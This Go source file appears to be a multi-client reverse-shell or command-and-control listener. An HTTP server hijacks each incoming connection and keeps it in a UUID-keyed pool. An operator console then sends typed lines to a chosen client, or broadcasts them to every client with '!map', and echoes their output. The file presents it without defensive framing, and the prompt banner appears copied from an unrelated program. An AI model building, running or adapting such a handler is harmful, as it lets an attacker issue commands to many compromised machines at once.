package main

import (
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"strings"

	"github.com/google/uuid"
	"gopkg.in/readline.v1"
)

type Client struct {
	UUID string
	Conn net.Conn
	Quit chan struct{}
}

func NewClient(uuid string, conn net.Conn, quit chan struct{}) *Client {
	return &Client{
		UUID: uuid,
		Conn: conn,
		Quit: quit,
	}
}

type Pool struct {
	Clients map[string]*Client
	Current *Client
}

func NewPool() *Pool {
	return &Pool{
		Clients: make(map[string]*Client),
		// Current: new(Client),
	}
}

var ClientPool = NewPool()

func (p *Pool) Del(uuid string) {
	delete(p.Clients, uuid)
	if (p.Current != nil) && (p.Current.UUID == uuid) {
		p.Current = nil //new(Client)
	}
}

func (p *Pool) Get(uuid string) *Client {
	return p.Clients[uuid]
}

func (p *Pool) Add(client *Client) {
	p.Clients[client.UUID] = client
}

func (p *Pool) Dump() {
	log.Println("[client pool]")
	isCurrent := func(uuid string) string {
		if (p.Current != nil) && (p.Current.UUID == uuid) {
			return "*"
		}
		return " "
	}
	for uuid, client := range p.Clients {
		fmt.Println(isCurrent(uuid), uuid, client.Conn.RemoteAddr())
	}
}

func (p *Pool) Has(uuid string) bool {
	if _, ok := p.Clients[uuid]; ok {
		return true
	}
	return false
}

func hijacker(w http.ResponseWriter, r *http.Request) {
	uuid := uuid.New().String()
	conn, _, err := w.(http.Hijacker).Hijack()
	if err != nil {
		log.Println(nil)
	}
	log.Println("connected:", uuid, conn.RemoteAddr())

	quit := make(chan struct{})
	client := NewClient(uuid, conn, quit)
	ClientPool.Add(client)
	ClientPool.Dump()
	copy := func(dst io.Writer, src io.Reader) {
		defer ClientPool.Dump()
		defer log.Println("disconnected:", uuid, client.Conn.RemoteAddr())
		defer close(client.Quit)
		defer ClientPool.Del(uuid)
		buf := make([]byte, 1)
		for {
			_, err := src.Read(buf)
			if err != nil {
				return
			}
			dst.Write(buf)
		}
	}
	go copy(os.Stdout, conn)

}

func input() {
	for {
		log.Println("ready to accept input!")
		rl, err := readline.NewEx(&readline.Config{
			HistoryFile:         "/tmp/readline.tmp",
			ForceUseInteractive: true,
			// InterruptPrompt:     "exit?",
		})
		if err != nil {
			panic(err)
		}
		defer rl.Close()
		fmt.Println("Welcome to Expreduce!!!")
		promptNum := 1
	INNER:
		for {
			rl.SetPrompt(fmt.Sprintf("In[%d]:= ", promptNum))
			line, err := rl.Readline()
			switch err {
			case nil: // NOP
			case io.EOF:
				fmt.Println("bye")
				// os.Exit(0)
				break INNER
			case readline.ErrInterrupt:
				// fmt.Println("hit ^D to exit")
				fmt.Println("try !exit, or !quit")
			default:
				fmt.Println(err)
			}
			if line == "" {
				continue
			}
			fmt.Println(line)
			// process line

			if strings.HasPrefix(line, "!map ") {
				line = strings.TrimPrefix(line, "!map ")
				for _, client := range ClientPool.Clients {
					client.Conn.Write([]byte(line + "\n"))
				}
				continue
			}
			if line == "!quit" {
				os.Exit(0)
			}
			if line == "!exit" {
				os.Exit(0)
			}
			if line == "!dump" {
				ClientPool.Dump()
				continue
			}
			if ClientPool.Has(line) {
				ClientPool.Current = ClientPool.Get(line)
				log.Println("current client:", ClientPool.Current.UUID)
				continue
			}
			if ClientPool.Current == nil {
				fmt.Println("[INFO] Your current client is empty. Enter the uuid to the client you want to talk to first:")
				continue
			}
			ClientPool.Current.Conn.Write([]byte(line + "\n"))

			promptNum += 1
		}

		/*
			scanner := bufio.NewScanner(os.Stdin)
			for scanner.Scan() {
				line := scanner.Text()
				// process line
			}
		*/
		log.Println("stdin input closed")
	}
}

func main() {
	http.HandleFunc("/", hijacker)
	log.Println("listening on http://localhost:8000")
	go input()
	log.Fatalln(http.ListenAndServe(":8000", nil))
}
